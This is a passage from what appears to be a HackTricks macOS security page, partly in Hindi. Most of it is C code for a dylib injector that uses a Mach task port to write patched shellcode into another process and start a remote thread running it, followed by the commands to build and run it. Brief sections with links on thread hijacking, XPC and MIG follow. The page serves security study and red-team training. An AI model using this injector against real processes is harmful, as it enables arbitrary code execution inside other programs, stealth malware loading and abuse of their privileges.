kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

इस तकनीक में प्रक्रिया के एक थ्रेड को हाईजैक किया जाता है:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Basic Information

XPC, जिसका अर्थ है XNU (macOS द्वारा उपयोग किया जाने वाला कर्नेल) इंटर-प्रोसेस कम्युनिकेशन, macOS और iOS पर **प्रक्रियाओं के बीच संचार** के लिए एक ढांचा है। XPC **सिस्टम पर विभिन्न प्रक्रियाओं के बीच सुरक्षित, असिंक्रोनस मेथड कॉल करने** के लिए एक तंत्र प्रदान करता है। यह एप्पल के सुरक्षा सिद्धांत का एक हिस्सा है, जो **विशेषाधिकार-सेपरेटेड एप्लिकेशन** के निर्माण की अनुमति देता है जहाँ प्रत्येक **घटक** केवल **उन्हीं अनुमतियों** के साथ चलता है जिनकी उसे अपने कार्य को करने के लिए आवश्यकता होती है, इस प्रकार एक समझौता की गई प्रक्रिया से संभावित नुकसान को सीमित करता है।

इस **संचार के काम करने के तरीके** और यह **कैसे कमजोर हो सकता है** के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG को **Mach IPC** कोड निर्माण की प्रक्रिया को **सरल बनाने** के लिए बनाया गया था। यह मूल रूप से एक दिए गए परिभाषा के लिए सर्वर और क्लाइंट के बीच संचार के लिए आवश्यक कोड **जनरेट करता है**। भले ही जनरेट किया गया कोड बदसूरत हो, एक डेवलपर को केवल इसे आयात करने की आवश्यकता होगी और उसका कोड पहले से कहीं अधिक सरल होगा।

अधिक जानकारी के लिए देखें:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
